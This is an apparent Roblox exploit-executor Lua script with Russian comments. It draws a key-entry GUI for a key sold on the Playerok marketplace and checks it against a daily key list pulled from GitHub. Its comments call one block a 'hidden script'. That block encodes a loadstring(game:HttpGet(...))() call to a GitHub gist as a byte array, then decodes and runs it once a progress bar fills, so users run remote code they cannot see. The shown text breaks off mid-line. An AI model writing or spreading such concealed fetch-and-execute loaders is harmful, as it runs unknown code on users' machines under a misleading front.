local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

-- Удаляем старый GUI
local oldGui = CoreGui:FindFirstChild("PlayerokKeyGui")
if oldGui then oldGui:Destroy() end

-- Загружаем ключи с GitHub
local keysURL = "https://raw.githubusercontent.com/RobloxScriptKey/MilediKeys-/main/MILEDI-keys.json"
local success, response = pcall(function() return game:HttpGet(keysURL) end)

local keys = {}
if success then
    keys = HttpService:JSONDecode(response)
end

local today = os.date("%Y-%m-%d")
local todayKeyTable = keys[today]

local validKey = nil
if todayKeyTable then
    validKey = ""
    for _, v in ipairs(todayKeyTable) do
        validKey = validKey .. string.char(v)
    end
end

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "PlayerokKeyGui"
gui.ResetOnSpawn = false
gui.Parent = CoreGui

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 0, 0, 0)
frame.Position = UDim2.new(0.5, 0, 0.4, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(120, 140, 255)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)

local grad = Instance.new("UIGradient", frame)
grad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 140, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 220, 255))
}
grad.Rotation = 45

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 60)
title.BackgroundTransparency = 1
title.Text = "🔐 Введите ключ от Playerok"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 22

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.8, 0, 0, 36)
box.Position = UDim2.new(0.1, 0, 0, 110)
box.PlaceholderText = "Вставьте ключ..."
box.Font = Enum.Font.Gotham
box.TextSize = 20
box.TextColor3 = Color3.fromRGB(50, 50, 50)
box.BackgroundColor3 = Color3.fromRGB(230, 230, 255)
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(0.8, 0, 0, 40)
button.Position = UDim2.new(0.1, 0, 0, 160)
button.BackgroundColor3 = Color3.fromRGB(160, 200, 255)
button.Font = Enum.Font.GothamBold
button.TextSize = 20
button.TextColor3 = Color3.fromRGB(30, 30, 30)
button.Text = "Проверить"
Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)

local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, 0, 0, 20)
feedback.Position = UDim2.new(0, 0, 0, 145)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.TextColor3 = Color3.new(1, 1, 1)
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 18

-- Кнопка копирования ссылки
local getKeyButton = Instance.new("TextButton", frame)
getKeyButton.Size = UDim2.new(0.8, 0, 0, 36)
getKeyButton.Position = UDim2.new(0.1, 0, 0, 210)
getKeyButton.BackgroundColor3 = Color3.fromRGB(180, 220, 255)
getKeyButton.Font = Enum.Font.GothamBold
getKeyButton.TextSize = 18
getKeyButton.TextColor3 = Color3.fromRGB(20, 20, 20)
getKeyButton.Text = "Получить ключ"
Instance.new("UICorner", getKeyButton).CornerRadius = UDim.new(0, 12)

getKeyButton.MouseButton1Click:Connect(function()
    setclipboard("https://playerok.com/profile/MILEDI-STORE/products")
    feedback.Text = "✅ Ссылка скопирована!"
    feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
end)

-- Прогресс-бар
local progressBackground = Instance.new("Frame", frame)
progressBackground.Size = UDim2.new(0.8, 0, 0, 20)
progressBackground.Position = UDim2.new(0.1, 0, 0, 260)
progressBackground.BackgroundColor3 = Color3.fromRGB(200, 200, 255)
Instance.new("UICorner", progressBackground).CornerRadius = UDim.new(0, 10)

local progressBar = Instance.new("Frame", progressBackground)
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(30, 200, 30)
Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 10)

-- 🔒 Скрытый скрипт в виде числового массива
local hiddenScriptNumbers = {}
local hiddenCode = [[
loadstring(game:HttpGet("https://gist.githubusercontent.com/UCT-hub/5b11d10386f1b8ce08feb803861e0b79/raw/b2917b398d4b0cc80fb2aca73a3137ba494ebcf0/gistfile1.txt"))()
]]
for i = 1, #hiddenCode do
    table.insert(hiddenScriptNumbers, string.byte(hiddenCode:sub(i,i)))
end

local function runHiddenScript()
    local code = ""
    for _, num in ipairs(hiddenScriptNumbers) do
        code = code .. string.char(num)
    end
    local success, err = pcall(function()
        loadstring(code)()
    end)
    if not success then
        warn("Ошибка при запуске скрытого скрипта: ", err)
    end
end

-- Анимации GUI
local function tweenIn(instance, duration, targetSize, targetPos)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local sizeTween = TweenService:Create(instance, tweenInfo, {Size = targetSize})
    local posTween = TweenService:Create(instance, tweenInfo, {Position = targetPos})
    sizeTween:Play()
    posTween:Play()
end

tweenIn(frame, 0.5, UDim2.new(0, 400, 0, 320), frame.Position)

-- Пульсация кнопки
local function pulseButton(btn)
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
    local tween = TweenService:Create(btn, tweenInfo, {Size = UDim2.new(0.82, 0, 0, 42)})
    tween:Play()
end
pulseButton(button)

-- Пульсация заголовка
RunService.RenderStepped:Connect(function()
    local scale = 1 + 0.05 * math.sin(tick() * 3)
    title.TextSize = 22 * scale
end)

-- Эффект «печатающегося» текста
local function typeText(lbl, txt)
    lbl.Text = ""
    spawn(function()
        for i = 1, #txt do
            lbl.Text = string.sub(txt,1,i)
            wait(0.03)
        end
    end)
end

-- Прогресс-бар
local function fillProgressBar()
    local duration = 2
    local startTime = tick()
    local conn
    conn = RunService.RenderStepped:Connect(function()
        local elapsed = tick() - startTime
        local pct = math.clamp(elapsed / duration, 0, 1)
        progressBar.Size = UDim2.new(pct, 0, 1, 0)
        if pct >= 1 then
            conn:Disconnect()
            gui:Destroy()
            runHiddenScript()
        end
    end)
end

-- Проверка ключа
button.MouseButton1Click:Connect(function()
    local input = box.Text:match("^%s*(.-)%s*$")
    if not validKey then
        typeText(feedback, "⚠️ Ключ на сегодня не найден")
        feedback.TextColor
